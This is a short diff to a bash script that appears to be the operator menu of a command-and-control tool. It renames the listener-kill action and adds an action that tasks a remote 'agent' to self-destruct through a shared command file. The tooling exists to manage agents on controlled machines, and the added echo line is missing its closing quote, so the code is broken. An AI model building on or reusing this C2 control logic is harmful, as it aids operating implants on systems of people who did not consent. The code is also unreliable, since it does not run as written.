@@ -24,7 +24,7 @@ echo "Task to $agent => $action $cmd" >> /tmp/C2CON-res.txt
 sleep 2
 clear
 
-elif [ "$action" = "kill" ]; then
+elif [ "$action" = "kill_lis" ]; then
 echo "Listener PID ?"
 read PID
 kill $PID
@@ -41,6 +41,14 @@ echo "Listener with $PID killed"
 sleep 2
 clear
 
+
+elif [ "$action" = "kill_ag" ]; then
+echo "Agent ?"
+read agent
+echo "Task Agent $agent to self-destruct >> /tmp/C2CON-res.txt
+echo "$agent:kill" >> /tmp/C2CON-cmds.txt
+sleep 2
+clear
 
 elif [ "$action" = "create" ]; then
 echo "What ?"
